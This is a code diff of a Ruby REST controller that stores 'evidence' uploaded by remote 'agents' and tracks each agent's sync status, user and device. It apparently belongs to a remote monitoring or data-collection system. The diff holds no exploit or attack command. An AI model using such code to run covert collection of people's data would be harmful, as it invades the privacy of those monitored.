@@ -3,11 +3,11 @@
 #
 
 require 'rcs-db/db_layer'
+require 'rcs-db/evidence_manager'
+require 'rcs-db/evidence_dispatcher'
 
 # rcs-common
-require 'rcs-common/evidence_manager'
 require 'rcs-common/symbolize'
-
 require 'eventmachine'
 require 'em-http-request'
 
@@ -26,21 +26,20 @@ class EvidenceController < RESTController
   def create
     require_auth_level :server
 
-    # create a phony session
-    session = {:instance => @params['_id']}
+    ident = @params['_id'].slice(0..13)
+    instance = @params['_id'].slice(15..-1)
 
     # save the evidence in the db
     begin
-      id = EvidenceManager.instance.store_evidence session, @request[:content].size, @request[:content]
+      id = RCS::DB::EvidenceManager.instance.store_evidence ident, instance, @request[:content]
       # notify the worker
-      trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
-      notification = {session[:instance] => [id]}.to_json
-      request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
-      request.callback {|http| http.response}
-    rescue
+      RCS::DB::EvidenceDispatcher.instance.notify id, ident, instance
+    rescue Exception => e
+      trace :warn, "Cannot save evidence: #{e.message}"
       return RESTController.reply.not_found
     end
-    
+
+    trace :info, "Evidence saved. Dispatching evidence of [#{ident}::#{instance}][#{id}]"
     return RESTController.reply.ok({:bytes => @request[:content].size})
   end
   
@@ -51,19 +50,16 @@ class EvidenceController < RESTController
     # create a phony session
     session = @params.symbolize
     
-    # retrieve the key from the db
+    # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return RESTController.reply.not_found if agent.nil?
-    key = agent[:logkey]
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
-    
-    # store the status
-    EvidenceManager.instance.sync_start session, @params['version'], @params['user'], @params['device'], @params['source'], time.to_i, key
 
     # update the stats
     agent.stat[:last_sync] = time
+    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
     agent.stat[:source] = @params['source']
     agent.stat[:user] = @params['user']
     agent.stat[:device] = @params['device']
@@ -79,8 +75,12 @@ class EvidenceController < RESTController
     # create a phony session
     session = @params.symbolize
 
-    # store the status
-    EvidenceManager.instance.sync_end session
+    # retrieve the agent from the db
+    agent = Item.where({_id: session[:bid]}).first
+    return RESTController.reply.not_found if agent.nil?
+
+    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
+    agent.save
 
     return RESTController.reply.ok
   end
@@ -92,8 +92,12 @@ class EvidenceController < RESTController
     # create a phony session
     session = @params.symbolize
 
-    # store the status
-    EvidenceManager.instance.sync_timeout session
+    # retrieve the agent from the db
+    agent = Item.where({_id: session[:bid]}).first
+    return RESTController.reply.not_found if agent.nil?
+
+    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
+    agent.save
 
     return RESTController.reply.ok
   end
